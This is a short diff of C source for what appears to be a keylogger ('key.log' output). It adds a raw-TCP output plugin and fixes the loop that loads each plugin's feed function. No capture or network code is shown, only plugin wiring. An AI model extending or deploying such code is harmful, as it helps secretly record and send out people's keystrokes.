@@ -15,7 +15,7 @@ time_t timeout = 0;
 
 int background = 0;
 char *outputfile = "key.log";
-const char *plugins[] = {"mikey-plaintext.so"};
+const char *plugins[] = {"mikey-rawtcp.so","mikey-plaintext.so"};
 
 void handleArgs(void **hdlarr, int argc, char* argv[]) {
 
@@ -66,7 +66,7 @@ void moduleFeed(void **hdlarr, char *b) {
     char *result;
     int i;
     for (i = 0; i < (sizeof(plugins) / sizeof(plugins[0])); i++) {
-        func = dlsym(hdlarr[0], "getFeed");
+        func = dlsym(hdlarr[i], "getFeed");
         result = dlerror();
         if (result) {
             printf("%s", result);
